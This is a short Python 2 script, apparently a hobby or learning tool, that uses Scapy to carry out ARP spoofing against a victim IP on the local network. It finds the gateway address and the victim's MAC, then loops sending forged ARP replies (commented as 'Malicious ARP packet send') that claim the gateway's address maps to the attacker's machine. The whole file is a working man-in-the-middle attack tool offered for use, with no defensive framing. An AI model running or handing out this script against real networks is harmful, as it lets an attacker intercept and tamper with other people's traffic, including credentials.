#coding: utf-8
import os
import logging
import re
import sys
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)	# Delete scapy logging
from scapy.all import *

victimIP = raw_input("[*] Please enter the victim's IP >> ")
ok = re.findall("([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})", victimIP)		# VictimIP validation check
if not(ok):
	print "Error occured! Invalid IP format."	
	sys.exit(1)

gatewayIP = os.popen("route | awk '/default/ { print $2 }'").read().replace('\n','')	# GatewayIP parsing
myIP = os.popen("ifconfig eth0 | awk '/inet addr:/ { print $2 }'").read()[5:].replace('\n','')		# HostIP parsing
myMAC = os.popen("ifconfig eth0 | awk '/HWaddr/ { print $5 }'").read().replace('\n','')		# HostMAC parsing
broadcast = 'ff:ff:ff:ff:ff:ff'
broadcast2 = '00:00:00:00:00:00'
arp_stat = os.popen("arp -a").read()		# arp table read

victimMAC = ""
temp = ""
ok = re.findall("\("+str(victimIP)+"\) at ([0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}) \[ether\]", arp_stat)	# ARP table MAC address parsing
if ok:
	victimMAC = ok[0]	# If exist

else:
	try:
		p = sr1(ARP(op=ARP.who_has, psrc=myIP, pdst=victimIP, hwsrc=myMAC, hwdst=broadcast2))		# Broadcast ARP packet to victimIP
		temp = p[0].summary()		# get ARP response packet
		ok = re.findall("ARP is at ([0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2})", temp)	# victimMAC parsing
		if ok:
			victimMAC = ok[0]	# victimMAC allocation
	except:
		print "Error occured! Can't load the victimMAC"
		sys.exit(1)

while(True):
	try:
		print "[*] Sending ARP Packet..."
		print "[**] Ctrl+C to exit."
		sendp(Ether(dst=victimMAC, src=myMAC)/ARP(op=ARP.is_at, psrc=gatewayIP, pdst=victimIP, hwsrc=myMAC, hwdst=victimMAC), count=3)	# Malicious ARP packet send
		time.sleep(5)		# 5sec term
	except:
		print "Error occured! Can't send a packet."
		sys.exit(1)

